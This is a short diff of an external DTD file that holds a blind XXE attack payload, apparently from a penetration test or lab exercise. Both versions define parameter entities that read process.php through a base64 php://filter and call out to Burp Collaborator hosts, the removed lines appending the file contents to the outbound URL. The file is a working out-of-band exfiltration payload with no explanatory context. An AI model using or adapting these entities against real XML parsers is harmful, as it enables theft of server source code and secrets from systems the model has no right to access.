@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=process.php">
-<!ENTITY % read "<!ENTITY % send SYSTEM 'https://6mtqrej7ash0pmhq6wf3f0dz0q6gu5.burpcollaborator.net/?%file;'>">
+<!ENTITY % file SYSTEM "https://1celh9920n7vfh7lwr5y5v3uqlwgk5.burpcollaborator.net?php://filter/convert.base64-encode/resource=process.php">
+<!ENTITY % read "<!ENTITY % send SYSTEM 'https://6mtqrej7ash0pmhq6wf3f0dz0q6gu5.burpcollaborator.net/'>">
